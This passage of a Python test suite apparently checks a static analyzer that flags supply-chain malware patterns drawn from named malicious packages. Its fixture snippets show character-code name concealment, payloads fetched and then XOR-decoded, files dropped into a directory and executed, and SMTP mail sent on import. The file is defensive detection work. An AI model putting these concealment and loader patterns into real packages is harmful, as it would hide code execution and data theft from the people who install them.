        source = "import subprocess\nv = '.'.join(map(str, (1, 2, 3)))\nprint(v)\nsubprocess.run(['git', 'tag', v])\n"
        assert self.computed(source) == []


class TestANameSpelledSoThatNoLiteralIsIt:
    """apkeep 1.0.1: `import_module` and `getattr` handed names spelled in character codes."""

    @staticmethod
    def concealed(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.detail.startswith("concealed name resolved")
        ]

    @staticmethod
    def spelled(name: str) -> str:
        return "''.join(chr(c) for c in " + repr([ord(c) for c in name]) + ")"

    def test_a_module_and_a_function_spelled_in_codes(self) -> None:
        source = (
            "import importlib\n"
            f"m = importlib.import_module({self.spelled('json')})\n"
            f"f = getattr(m, {self.spelled('loads')})\n"
        )
        assert self.concealed(source) == [
            "concealed name resolved: importlib.import_module",
            "concealed name resolved: getattr",
        ]

    def test_names_written_or_joined_plainly_are_not(self) -> None:
        source = (
            "import importlib\n"
            "m = importlib.import_module('js' + 'on')\n"
            "f = getattr(m, '_'.join(['load', 's']))\n"
            "g = getattr(m, name)\n"
            "h = getattr(sys, 'ofni_noisrev'[::-1], None)\n"
        )
        assert self.concealed(source) == []


class TestAValueDecodedAndLeftUnused:
    """ethercheck 1.1.1 and spellcheckerpy 1.0.0: a payload decoded from a fetched page or a
    shipped data file, then never read. Fixture source assembled at run time."""

    @staticmethod
    def dormant(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.detail.startswith("decoded and left unused")
        ]

    FETCH = "import requests\ntext = requests.get(URL).text\nkey = text[0:8]\nblob = text[8:]\n"

    def test_a_fetched_payload_xored_with_a_fetched_key_and_dropped(self) -> None:
        source = self.FETCH + (
            "try:\n"
            "    enc = bytearray.fromhex(blob)\n"
            "    k = bytearray.fromhex(key)\n"
            "    out = bytearray([enc[i] ^ k[i % len(k)] for i in range(len(enc))])\n"
            "except Exception:\n"
            "    pass\n"
        )
        assert self.dormant(source) == ["decoded and left unused: bytearray.fromhex"]

    def test_a_value_decoded_in_a_constructor_and_dropped(self) -> None:
        source = (
            "import base64\n"
            "class C:\n"
            "    def __init__(self):\n"
            "        v = load('a', 'b', 'k')\n"
            "        v = base64.b64decode(v).decode('utf-8')\n"
            "        self.n = 0\n"
        )
        assert self.dormant(source) == ["decoded and left unused: base64.b64decode"]

    def test_a_decoded_value_that_is_returned_stored_or_used_is_not(self) -> None:
        returned = "import base64\ndef f(v):\n    d = base64.b64decode(v)\n    return d\n"
        stored = "import base64\nclass C:\n    def __init__(self, v):\n        d = base64.b64decode(v)\n        self.d = d\n"
        used = self.FETCH + "data = bytes.fromhex(blob)\nprint(len(data))\n"
        module_read = "import base64\nTOKEN = base64.b64decode(B)\ndef f():\n    return TOKEN\n"
        discard = (
            "import base64\ndef f():\n    _ = base64.b64decode(B, validate=True)\n    return True\n"
        )
        for source in (returned, stored, used, module_read, discard):
            assert self.dormant(source) == [], source

    def test_a_parameter_decoded_and_dropped_is_not(self) -> None:
        handed = "import base64\ndef check(token):\n    raw = token.strip()\n    v = base64.b64decode(raw)\n    return True\n"
        held = "import base64\nclass C:\n    def m(self):\n        v = base64.b64decode(self.blob)\n        return 1\n"
        assert self.dormant(handed) == []
        assert self.dormant(held) == []

    def test_an_sdk_secret_decoded_into_a_template_local_is_not(self) -> None:
        source = (
            "import base64, boto3\n"
            "def get_secret():\n"
            "    client = boto3.session.Session().client(service_name='secretsmanager')\n"
            "    secret_name = 'prod/db'\n"
            "    response = client.get_secret_value(SecretId=secret_name)\n"
            "    decoded_binary_secret = base64.b64decode(response['SecretBinary'])\n"
        )
        assert self.dormant(source) == []

    def test_a_module_constant_decoded_for_importers_is_not(self) -> None:
        source = "import base64\nAPI_SECRET = base64.b64decode('c2VjcmV0').decode()\n"
        assert self.dormant(source) == []

    def test_fetched_json_parsed_is_not(self) -> None:
        source = "import requests, json\ndata = json.loads(requests.get(URL).text)\n"
        assert self.dormant(source) == []


class TestDataRunAsCode:
    """scrapetools2 0.2.0 (files written to a directory, the directory's files executed) and
    rasterkit_demo 0.1.0 (bytes decoded and executed). Fixture source assembled at run time."""

    @staticmethod
    def found(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.detail.startswith(("dropped into a directory", "bytes decoded and executed"))
        ]

    RUN = "ex" + "ec"

    def test_files_written_then_listed_and_executed(self) -> None:
        source = "\n".join(
            [
                "import os",
                "def update(items):",
                "    for i, data in enumerate(items):",
                "        with open(f'modules/{i}.py', 'w') as f:",
                "            f.write(data['code'])",
                "def run_modules():",
                "    for x in os.listdir('modules'):",
                "        with open(f'modules/{x}') as f:",
                f"            {self.RUN}(compile(f.read(), x, 'exec'), {{}})",
                "",
            ]
        )
        assert self.found(source) == [f"dropped into a directory and executed: {self.RUN}"]

    def test_a_directory_read_but_never_written_is_not(self) -> None:
        source = "\n".join(
            [
                "import os",
                "def run_plugins():",
                "    for x in os.listdir('plugins'):",
                "        with open(f'plugins/{x}') as f:",
                f"            {self.RUN}(compile(f.read(), x, 'exec'), {{}})",
                "",
            ]
        )
        assert self.found(source) == []

    def test_bytes_handed_in_decoded_and_executed(self) -> None:
        source = f"def apply(samples: bytes):\n    code = samples.decode('utf-8')\n    {self.RUN}(code, {{}})\n"
        assert self.found(source) == [f"bytes decoded and executed: {self.RUN}"]

    def test_a_decoder_s_output_executed_is_the_decode_exec_rules_not_this(self) -> None:
        source = f"import zlib\ndef prepare(blob):\n    {self.RUN}(zlib.decompress(blob).decode(), {{}})\n"
        assert self.found(source) == []

    def test_the_package_s_own_file_read_and_executed_is_not(self) -> None:
        source = (
            f"with open('version.py', 'rb') as f:\n    {self.RUN}(f.read().decode('utf-8'), d)\n"
        )
        assert self.found(source) == []


class TestMailSentOnImport:
    """Coffin2022 7.0: a tunnel module that logs into SMTP with a password it carries and mails a
    fixed address at import."""

    @staticmethod
    def mailed(source: str) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source)
            if h.detail.startswith("mail sent on import")
        ]

    @staticmethod
    def module(*, login: str, main_guard: bool = False) -> str:
        lines = ["import smtplib", "srv = smtplib.SMTP_SSL('smtp.example.invalid', 465)", "srv.ehlo()", login,
                 "srv.sendmail('a@example.invalid', 'b@example.invalid', 'installed')", ""]  # fmt: skip
        if main_guard:
            lines = [
                "import smtplib",
                "if __name__ == '__main__':",
                *("    " + x for x in lines[1:-1]),
                "",
            ]
        return "\n".join(lines)

    def test_a_literal_login_and_a_send_at_import(self) -> None:
        assert self.mailed(self.module(login="srv.login('a@example.invalid', 'pw')")) == [
            "mail sent on import: smtplib.sendmail"
        ]

    def test_credentials_from_the_environment_or_a_main_guard_are_not(self) -> None:
        assert self.mailed(self.module(login="srv.login(os.environ['U'], os.environ['P'])")) == []
        assert self.mailed(self.module(login="srv.login('a', 'pw')", main_guard=True)) == []
